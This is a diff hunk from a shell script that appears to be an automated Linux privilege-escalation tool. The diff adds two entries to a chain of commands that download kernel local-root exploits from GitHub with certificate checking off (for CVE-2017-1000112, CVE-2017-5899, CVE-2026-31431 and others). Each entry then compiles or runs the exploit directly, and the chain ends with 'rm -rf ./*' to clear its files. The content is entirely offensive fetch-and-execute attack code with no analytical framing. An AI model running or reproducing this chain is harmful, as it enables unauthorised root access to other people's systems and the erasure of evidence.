@@ -257,6 +257,8 @@ if [ $localroot = 5 ]; then
     wget -q --no-check-certificate https://raw.githubusercontent.com/jollheef/lpe/master/CVE-2017-1000112/CVE-2017-1000112.c -O pwn.c && gcc pwn.c -o pwn && ./pwn
     wget -q --no-check-certificate https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh && bash exploit.sh
     wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/cve-2026-41651 && chmod +x cve-2026-41651 && ./cve-2026-41651
+    wget -q --no-check-certificate https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/dirtyfrag && chmod +x dirtyfrag && ./dirtyfrag
+    wget -q --no-check-certificate https://raw.githubusercontent.com/theori-io/copy-fail-CVE-2026-31431/refs/heads/main/copy_fail_exp.py && python copy_fail_exp.py && python3 copy_fail_exp.py
     cd .. && git clone https://github.com/Markakd/CVE-2021-4154 && cd CVE-2021-4154 && gcc exp.c -o exp && gcc kctf_exp.c -o kctf
     ./exp && ./kctf
     rm -rf ./*
